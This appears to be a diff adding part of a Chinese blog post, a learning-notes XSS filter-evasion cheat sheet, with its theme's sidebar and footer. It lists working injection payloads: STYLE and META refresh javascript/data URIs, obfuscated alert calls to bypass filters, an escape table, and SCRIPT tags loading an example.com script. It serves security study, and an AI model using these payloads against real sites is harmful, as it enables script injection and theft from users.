class="number">105.</span>seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可</span><br><span class="line">以从该点播放。这个段落包含了一个重复的时间线，并包括使用 AUTOREVERSE 属性</span><br><span class="line">进行反向播放。)</span><br></pre></td></tr></table></figure>
+<h3 id="含有分隔JavaScript的STYLE标签"><a href="#含有分隔JavaScript的STYLE标签" class="headerlink" title="-含有分隔JavaScript的STYLE标签"></a>-含有分隔JavaScript的STYLE标签</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt;@im\port<span class="string">'\ja\vasc\ript:alert("XSS")'</span>;&lt;<span class="regexp">/STYLE&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="META"><a href="#META" class="headerlink" title="-META"></a>-META</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0;url=data:text/html base64,PHNjc</span></span><br><span class="line"><span class="string">mlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;META HTTP-EQUIV=<span class="string">"refresh"</span> CONTENT=<span class="string">"0; URL=http://;URL=javascript:alert</span></span><br><span class="line"><span class="string">('XSS');"</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Alert混淆以绕过过滤器"><a href="#Alert混淆以绕过过滤器" class="headerlink" title="Alert混淆以绕过过滤器"></a>Alert混淆以绕过过滤器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(alert)(<span class="number">1</span>) </span><br><span class="line">a=alert,a(<span class="number">1</span>) </span><br><span class="line">[<span class="number">1</span>].find(alert) </span><br><span class="line">top[“al”+”ert”](<span class="number">1</span>) </span><br><span class="line">top[<span class="regexp">/al/</span>.source+<span class="regexp">/ert/</span>.source](<span class="number">1</span>) </span><br><span class="line">al\u0065rt(<span class="number">1</span>) </span><br><span class="line">top[‘al\<span class="number">145</span>rt’](<span class="number">1</span>) </span><br><span class="line">top[‘al\x65rt’](<span class="number">1</span>) </span><br><span class="line">top[<span class="number">8680439.</span>.toString(<span class="number">30</span>)](<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="字符转义表"><a href="#字符转义表" class="headerlink" title="-字符转义表"></a>-字符转义表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt; </span><br><span class="line">%<span class="number">3</span>C </span><br><span class="line">&amp;lt </span><br><span class="line">&amp;lt; </span><br><span class="line">&amp;LT </span><br><span class="line">&amp;LT; </span><br><span class="line">&amp;#60 </span><br><span class="line">&amp;#060 </span><br><span class="line">&amp;#0060 </span><br><span class="line">&amp;#00060 </span><br><span class="line">&amp;#000060 </span><br><span class="line">&amp;#0000060 </span><br><span class="line">&amp;#60; </span><br><span class="line">&amp;#060; </span><br><span class="line">&amp;#0060; </span><br><span class="line">&amp;#00060; </span><br><span class="line">&amp;#000060; </span><br><span class="line">&amp;#0000060; </span><br><span class="line">&amp;#x3c </span><br><span class="line">&amp;#x03c </span><br><span class="line">&amp;#x003c </span><br><span class="line">&amp;#x0003c </span><br><span class="line">&amp;#x00003c </span><br><span class="line">&amp;#x000003c </span><br><span class="line">&amp;#x3c; </span><br><span class="line">&amp;#x03c; </span><br><span class="line">&amp;#x003c; </span><br><span class="line">&amp;#x0003c; </span><br><span class="line">&amp;#x00003c; </span><br><span class="line">&amp;#x000003c; </span><br><span class="line">&amp;#X3c </span><br><span class="line">&amp;#X03c </span><br><span class="line">&amp;#X003c </span><br><span class="line">&amp;#X0003c </span><br><span class="line">&amp;#X00003c </span><br><span class="line">&amp;#X000003c </span><br><span class="line">&amp;#X3c; </span><br><span class="line">&amp;#X03c; </span><br><span class="line">&amp;#X003c; </span><br><span class="line">&amp;#X0003c; </span><br><span class="line">&amp;#X00003c; </span><br><span class="line">&amp;#X000003c; </span><br><span class="line">&amp;#x3C </span><br><span class="line">&amp;#x03C </span><br><span class="line">&amp;#x003C </span><br><span class="line">&amp;#x0003C </span><br><span class="line">&amp;#x00003C </span><br><span class="line">&amp;#x000003C </span><br><span class="line">&amp;#x3C; </span><br><span class="line">&amp;#x03C; </span><br><span class="line">&amp;#x003C; </span><br><span class="line">&amp;#x0003C; </span><br><span class="line">&amp;#x00003C; </span><br><span class="line">&amp;#x000003C; </span><br><span class="line">&amp;#X3C </span><br><span class="line">&amp;#X03C </span><br><span class="line">&amp;#X003C </span><br><span class="line">&amp;#X0003C </span><br><span class="line">&amp;#X00003C </span><br><span class="line">&amp;#X000003C </span><br><span class="line">&amp;#X3C; </span><br><span class="line">&amp;#X03C; </span><br><span class="line">&amp;#X003C; </span><br><span class="line">&amp;#X0003C; </span><br><span class="line">&amp;#X00003C; </span><br><span class="line">&amp;#X000003C; </span><br><span class="line">\x3c </span><br><span class="line">\x3C </span><br><span class="line">\u003c </span><br><span class="line">\u003C</span><br></pre></td></tr></table></figure>
+<h3 id="使用HTML引号包含的XSS"><a href="#使用HTML引号包含的XSS" class="headerlink" title="-使用HTML引号包含的XSS"></a>-使用HTML引号包含的XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT a=<span class="string">"&gt;"</span> SRC=<span class="string">"http://example.com/xss.js"</span>&gt;&lt;<span class="regexp">/SCRIPT&gt; </span></span><br><span class="line"><span class="regexp">&lt;SCRIPT ="&gt;" SRC="http:/</span><span class="regexp">/example.com/</span>xss.js<span class="string">"&gt;&lt;/SCRIPT&gt; </span></span><br><span class="line"><span class="string">&lt;SCRIPT a="</span>&gt;<span class="string">" '' SRC="</span>http:<span class="comment">//example.com/xss.js"&gt;&lt;/SCRIPT&gt; </span></span><br><span class="line">&lt;SCRIPT <span class="string">"a='&gt;'"</span> SRC=<span class="string">"http://example.com/xss.js"</span>&gt;&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Other"><a href="#Other" class="headerlink" title="-Other"></a>-Other</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">`filter`</span>][<span class="string">`constructor`</span>](<span class="string">`ale`</span>.concat(<span class="string">`rt\x28`</span>.concat<span class="string">`0\x29`</span>))();<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/学习笔记/" rel="tag"># 学习笔记</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/07/JavaScript权威指南学习笔记/" rel="next" title="JavaScript权威指南学习笔记">
+                <i class="fa fa-chevron-left"></i> JavaScript权威指南学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/17/计算机网络学习笔记/" rel="prev" title="计算机网络学习笔记">
+                计算机网络学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Caoyifan</p>
+              <p class="site-description motion-element" itemprop="description">web漏洞 代码审计 xss</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/elssm" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://elssm.lofter.com" target="_blank" title="Lofter">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Lofter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用URL编码器对整个代码进行编码"><span class="nav-number">1.</span> <span class="nav-text">-使用URL编码器对整个代码进行编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#较短的xss定位器"><span class="nav-number">2.</span> <span class="nav-text">-较短的xss定位器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用多语言进行过滤绕过"><span class="nav-number">3.</span> <span class="nav-text">-利用多语言进行过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML实体"><span class="nav-number">4.</span> <span class="nav-text">-HTML实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重音符混淆"><span class="nav-number">5.</span> <span class="nav-text">-重音符混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#A标签"><span class="nav-number">6.</span> <span class="nav-text">-A标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IMG标签"><span class="nav-number">7.</span> <span class="nav-text">-IMG标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内嵌TAB"><span class="nav-number">8.</span> <span class="nav-text">-内嵌TAB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内嵌换行分割"><span class="nav-number">9.</span> <span class="nav-text">-内嵌换行分割</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内嵌回车"><span class="nav-number">10.</span> <span class="nav-text">-内嵌回车</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JavaScript双重转义"><span class="nav-number">11.</span> <span class="nav-text">-JavaScript双重转义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ECMAScript-6"><span class="nav-number">12.</span> <span class="nav-text">-ECMAScript 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#事件处理程序"><span class="nav-number">13.</span> <span class="nav-text">-事件处理程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#含有分隔JavaScript的STYLE标签"><span class="nav-number">14.</span> <span class="nav-text">-含有分隔JavaScript的STYLE标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#META"><span class="nav-number">15.</span> <span class="nav-text">-META</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Alert混淆以绕过过滤器"><span class="nav-number">16.</span> <span class="nav-text">Alert混淆以绕过过滤器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符转义表"><span class="nav-number">17.</span> <span class="nav-text">-字符转义表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用HTML引号包含的XSS"><span class="nav-number">18.</span> <span class="nav-text">-使用HTML引号包含的XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other"><span class="nav-number">19.</span> <span class="nav-text">-Other</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Caoyifan</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
